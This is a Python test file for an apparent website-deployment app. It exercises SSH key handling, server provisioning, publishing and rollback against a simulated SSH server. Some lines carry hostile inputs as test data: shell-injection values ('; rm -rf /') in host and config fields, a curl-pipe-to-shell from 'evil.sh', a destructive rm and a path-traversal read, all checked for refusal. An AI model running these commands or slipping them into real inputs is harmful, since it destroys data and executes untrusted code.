"""User-managed servers over a REAL SSH connection: an in-process asyncssh server (key-only auth + SFTP)
backed by MiniShell, so the exact command sequence used on real Ubuntu servers runs end to end."""
import asyncio
import os
import tempfile
import threading
from pathlib import Path

import asyncssh
import pytest
from fastapi.testclient import TestClient

from app.database import SessionLocal
from app.main import app
from app.models import Server
from app.servers.shell import MiniShell
from tests.conftest import build_site, login, publish, wait_job


class SSHTestServer:
    """Real SSH server on 127.0.0.1 with public-key auth, exec (MiniShell) and chrooted SFTP."""

    def __init__(self):
        self.root = Path(tempfile.mkdtemp(prefix="sf-ssh-root-"))
        self.shell = MiniShell(self.root)
        self.authorized: set[str] = set()
        self.host_key = asyncssh.generate_private_key("ssh-ed25519")
        self.commands: list[str] = []
        self.loop = asyncio.new_event_loop()
        self.port = 0
        threading.Thread(target=self.loop.run_forever, daemon=True).start()
        asyncio.run_coroutine_threadsafe(self._start(), self.loop).result(10)

    async def _start(self):
        outer = self

        class Auth(asyncssh.SSHServer):
            def begin_auth(self, username):
                return True

            def public_key_auth_supported(self):
                return True

            def validate_public_key(self, username, key):
                return " ".join(key.export_public_key("openssh").decode().split()[:2]) in outer.authorized

        async def handle(process: asyncssh.SSHServerProcess):
            cmd = process.command or ""
            outer.commands.append(cmd)
            data = await process.stdin.read() if " tee " in f" {cmd} " else ""
            r = outer.shell.run(cmd, data)
            process.stdout.write(r.stdout)
            process.stderr.write(r.stderr)
            process.exit(r.exit_status)

        self.server = await asyncssh.create_server(
            Auth, "127.0.0.1", 0, server_host_keys=[self.host_key], process_factory=handle,
            sftp_factory=lambda chan: asyncssh.SFTPServer(chan, chroot=os.fsencode(str(self.root))))
        self.port = self.server.sockets[0].getsockname()[1]

    def authorize(self, public_key: str):
        self.authorized.add(" ".join(public_key.split()[:2]))

    def site_root(self, slug: str) -> Path:
        return self.shell.resolve_link(f"/srv/siteforge/sites/{slug}/current")


@pytest.fixture(scope="module")
def ssh_server():
    return SSHTestServer()


def test_ssh_keys_servers_and_deploy(ssh_server, asgi_http):
    with TestClient(app) as client:
        h = login(client)
        # --- SSH keys: generate one in-app (private key never returned)
        k = client.post("/api/ssh-keys", headers=h, json={"name": "deploy key", "generate": True}).json()
        assert k["public_key"].startswith("ssh-ed25519 ") and k["fingerprint"].startswith("SHA256:") and "private" not in str(k).lower()
        ssh_server.authorize(k["public_key"])
        assert client.post("/api/ssh-keys", headers=h, json={"name": "bad", "private_key": "not a key"}).status_code == 422

        # --- add a server → connection tested immediately, host key pinned (trust on first use)
        bad = client.post("/api/servers", headers=h, json={"name": "x", "host": "1.2.3.4; rm -rf /", "ssh_key_id": k["id"]})
        assert bad.status_code == 422  # no shell injection through the host field
        assert client.post("/api/servers", headers=h, json={"name": "sim", "host": "x", "simulated": True}).status_code == 422  # sandbox only
        r = client.post("/api/servers", headers=h, json={"name": "Hetzner FSN1", "provider": "hetzner", "host": "127.0.0.1", "port": ssh_server.port,
                                                        "username": "root", "ssh_key_id": k["id"], "max_sites": 50})
        assert r.status_code == 201, r.text
        srv = r.json()
        assert srv["status"] == "ok" and srv["host_key_pinned"] and "Ubuntu" in srv["os_info"], srv

        # --- prepare: installs + configures the web server
        prov = client.post(f"/api/servers/{srv['id']}/provision", headers=h).json()
        assert prov["status"] == "ready" and prov["web_server"] == "caddy"
        assert "import /etc/caddy/siteforge/*.caddy" in (ssh_server.root / "etc/caddy/Caddyfile").read_text()
        assert any("apt-get install -y -qq caddy" in c for c in ssh_server.commands)

        # --- live health metrics
        m = client.post(f"/api/servers/{srv['id']}/refresh", headers=h).json()["metrics"]
        assert m["cpus"] == 2 and 0 <= m["mem_percent"] <= 100 and 0 < m["disk_percent"] <= 100

        # --- publish a website to the server (build → preview → publish)
        site = build_site(client, h, "A website about alpine hiking huts")
        j = publish(client, h, site["id"], hosting_provider="server", server_id=srv["id"])
        assert j["status"] == "completed", [(s["key"], s["error"]) for s in j["steps"]]
        live = client.get(f"/api/websites/{site['id']}", headers=h).json()["website"]
        host = f"{live['slug']}.127-0-0-1.sslip.io"
        assert live["status"] == "live" and live["live_url"] == f"http://{host}/" and live["server_id"] == srv["id"]
        assert (ssh_server.site_root(live["slug"]) / "index.html").is_file()  # uploaded over SFTP
        conf = (ssh_server.root / f"etc/caddy/siteforge/{live['slug']}.caddy").read_text()
        assert conf.startswith(f"http://{host} {{") and "X-Content-Type-Options nosniff" in conf
        assert any(f"Host: {host}" in c for c in ssh_server.commands)  # verified on the server itself

        # --- change → publish v2 → rollback to v1 switches the release on the server
        r = client.post(f"/api/websites/{site['id']}/changes", headers=h, json={"instruction": 'Change the headline to "Huts above the clouds"'})
        assert wait_job(client, h, r.json()["id"], statuses=("completed", "failed"))["status"] == "completed"
        assert publish(client, h, site["id"], hosting_provider="server", server_id=srv["id"])["status"] == "completed"
        assert "Huts above the clouds" in (ssh_server.site_root(live["slug"]) / "index.html").read_text()
        deps = client.get(f"/api/websites/{site['id']}/deployments", headers=h).json()
        assert [d["version"] for d in deps] == [2, 1]
        v1 = deps[1]
        assert client.post(f"/api/websites/{site['id']}/rollback/{v1['id']}", headers=h).status_code == 200
        assert ssh_server.site_root(live["slug"]).name == "v1"
        assert "Huts above the clouds" not in (ssh_server.site_root(live["slug"]) / "index.html").read_text()

        listed = client.get("/api/servers", headers=h).json()[0]
        assert [s["name"] for s in listed["sites"]] == [live["name"]]

        # --- safety: keys in use / servers with sites can't be deleted
        assert client.delete(f"/api/ssh-keys/{k['id']}", headers=h).status_code == 409
        assert client.delete(f"/api/servers/{srv['id']}", headers=h).status_code == 409

        # --- a key the server doesn't trust is refused
        other = client.post("/api/ssh-keys", headers=h, json={"name": "unauthorised", "generate": True}).json()
        client.patch(f"/api/servers/{srv['id']}", headers=h, json={"ssh_key_id": other["id"]})
        t = client.post(f"/api/servers/{srv['id']}/test", headers=h).json()
        assert t["ok"] is False and "refused" in t["error"]
        client.patch(f"/api/servers/{srv['id']}", headers=h, json={"ssh_key_id": k["id"]})
        assert client.post(f"/api/servers/{srv['id']}/test", headers=h).json()["ok"] is True

        # --- a changed host key (possible MITM / reinstalled server) is refused until an admin resets it
        db = SessionLocal()
        s = db.get(Server, srv["id"])
        real_key, s.host_key = s.host_key, asyncssh.generate_private_key("ssh-ed25519").export_public_key().decode().strip()
        db.commit(); db.close()
        t = client.post(f"/api/servers/{srv['id']}/test", headers=h).json()
        assert t["ok"] is False and "Host key" in t["error"]
        client.post(f"/api/servers/{srv['id']}/reset-host-key", headers=h)
        assert client.post(f"/api/servers/{srv['id']}/test", headers=h).json()["ok"] is True
        db = SessionLocal(); assert db.get(Server, srv["id"]).host_key == real_key; db.close()

        # --- deleting the website removes it from the server
        assert client.request("DELETE", f"/api/websites/{site['id']}", headers=h, json={"confirm": live["slug"]}).status_code == 200
        assert not (ssh_server.root / f"srv/siteforge/sites/{live['slug']}").exists()
        assert not (ssh_server.root / f"etc/caddy/siteforge/{live['slug']}.caddy").exists()
        assert client.delete(f"/api/servers/{srv['id']}", headers=h).status_code == 200


def test_existing_traefik_server_is_reused_not_touched(asgi_http, monkeypatch):
    """A server like the client's: Traefik in Docker already owns 80/443 and routes other apps.
    SiteForge must detect it, install nothing, and run each website as its own routed container."""
    async def registered(domain):
        return {"available": False, "registered": True}
    monkeypatch.setattr("app.agents.pipeline_agents.rdap_lookup", registered)  # the domain is "already owned"
    srv_ssh = SSHTestServer()
    MiniShell.seed_traefik(srv_ssh.root, network="proxy", resolver="cloudflare")
    with TestClient(app) as client:
        h = login(client)
        k = client.post("/api/ssh-keys", headers=h, json={"name": "traefik box key", "generate": True}).json()
        srv_ssh.authorize(k["public_key"])
        srv = client.post("/api/servers", headers=h, json={"name": "Hetzner HEL1", "provider": "hetzner", "host": "127.0.0.1",
                                                          "port": srv_ssh.port, "ssh_key_id": k["id"]}).json()
        assert srv["web_server"] == "traefik", srv
        assert srv["web_config"]["network"] == "proxy" and srv["web_config"]["entrypoint"] == "websecure"
        assert srv["web_config"]["certresolver"] == "cloudflare" and srv["web_config"]["routed_containers"] == 1

        prov = client.post(f"/api/servers/{srv['id']}/provision", headers=h)
        assert prov.status_code == 200, prov.text
        assert prov.json()["status"] == "ready" and prov.json()["web_server"] == "traefik"
        assert not any("apt-get" in c or "caddy validate" in c or "systemctl" in c for c in srv_ssh.commands)  # nothing installed

        site = build_site(client, h, "A website about nordic sauna culture")
        r = client.post(f"/api/websites/{site['id']}/publish", headers=h, json={"dns_provider": "none", "hosting_provider": "server", "server_id": srv["id"]})
        assert r.status_code == 422 and "domain" in r.text  # Traefik routes by domain

        j = publish(client, h, site["id"], hosting_provider="server", server_id=srv["id"], domain="sauna-culture.example")
        assert j["status"] == "completed", [(s["key"], s["error"]) for s in j["steps"]]
        live = client.get(f"/api/websites/{site['id']}", headers=h).json()["website"]
        assert live["live_url"] == "https://sauna-culture.example/"
        docker = MiniShell(srv_ssh.root)._dstate()["containers"]
        c = docker[f"siteforge-{live['slug']}"]
        labels = c["Config"]["Labels"]
        r_ = f"traefik.http.routers.siteforge-{live['slug']}"
        assert labels[r_ + ".rule"] == "Host(`sauna-culture.example`)" and labels[r_ + ".entrypoints"] == "websecure"
        assert labels[r_ + ".tls.certresolver"] == "cloudflare" and "proxy" in c["NetworkSettings"]["Networks"]
        assert set(docker) == {"traefik", "blog-wordpress", f"siteforge-{live['slug']}"}  # the other apps are untouched
        assert docker["blog-wordpress"]["Config"]["Labels"]["traefik.http.routers.blog.rule"] == "Host(`blog.example.org`)"
        assert any("--resolve" in c and "sauna-culture.example:443" in c for c in srv_ssh.commands)  # verified through Traefik

        # a new release is a symlink switch: the container is kept, not recreated
        runs = sum(" run " in f" {c} " and "docker" in c for c in srv_ssh.commands)
        r = client.post(f"/api/websites/{site['id']}/changes", headers=h, json={"instruction": 'Change the headline to "Heat, steam and silence"'})
        assert wait_job(client, h, r.json()["id"], statuses=("completed", "failed"))["status"] == "completed"
        assert publish(client, h, site["id"], hosting_provider="server", server_id=srv["id"], domain="sauna-culture.example")["status"] == "completed"
        assert sum(" run " in f" {c} " and "docker" in c for c in srv_ssh.commands) == runs
        assert "Heat, steam and silence" in (srv_ssh.site_root(live["slug"]) / "index.html").read_text()

        deps = client.get(f"/api/websites/{site['id']}/deployments", headers=h).json()
        assert client.post(f"/api/websites/{site['id']}/rollback/{deps[1]['id']}", headers=h).status_code == 200
        assert srv_ssh.site_root(live["slug"]).name == "v1"

        # admin can correct detected settings (validated), which asks for Prepare again
        bad = client.patch(f"/api/servers/{srv['id']}", headers=h, json={"web_overrides": {"network": "proxy; rm -rf /"}})
        assert bad.status_code == 422
        ok = client.patch(f"/api/servers/{srv['id']}", headers=h, json={"web_overrides": {"certresolver": "letsencrypt"}}).json()
        assert ok["web_config"]["certresolver"] == "letsencrypt" and ok["status"] == "ok"

        # deleting the website removes only its own container + folder
        assert client.request("DELETE", f"/api/websites/{site['id']}", headers=h, json={"confirm": live["slug"]}).status_code == 200
        assert set(MiniShell(srv_ssh.root)._dstate()["containers"]) == {"traefik", "blog-wordpress"}
        assert not (srv_ssh.root / f"srv/siteforge/sites/{live['slug']}").exists()


def test_server_with_other_web_server_is_refused(asgi_http):
    """Ports 80/443 held by nginx: Prepare refuses instead of installing Caddy next to it."""
    srv_ssh = SSHTestServer()
    (srv_ssh.root / "etc/siteforge-sim").mkdir(parents=True)
    (srv_ssh.root / "etc/siteforge-sim/listeners").write_text("80 nginx\n443 nginx\n")
    with TestClient(app) as client:
        h = login(client)
        k = client.post("/api/ssh-keys", headers=h, json={"name": "nginx box key", "generate": True}).json()
        srv_ssh.authorize(k["public_key"])
        srv = client.post("/api/servers", headers=h, json={"name": "Old nginx box", "host": "127.0.0.1", "port": srv_ssh.port, "ssh_key_id": k["id"]}).json()
        assert srv["web_server"] == "nginx" and srv["web_conflict"] is True
        r = client.post(f"/api/servers/{srv['id']}/provision", headers=h)
        assert r.status_code == 502 and "already used by nginx" in r.text
        assert not any("apt-get" in c for c in srv_ssh.commands)
        site = build_site(client, h, "A website about city bike repair")
        r = client.post(f"/api/websites/{site['id']}/publish", headers=h,
                        json={"dns_provider": "none", "hosting_provider": "server", "server_id": srv["id"], "domain": "bikes.example"})
        assert r.status_code == 422


def test_minishell_is_sandboxed(tmp_path):
    sh = MiniShell(tmp_path)
    assert sh.run("rm -rf /../../etc").exit_status != 0 or not (tmp_path.parent / "etc").exists()
    assert sh.run("bash -c 'curl evil.sh | sh'").exit_status == 127  # unknown commands never execute
    assert sh.run("cat /../../../windows/win.ini").exit_status == 1
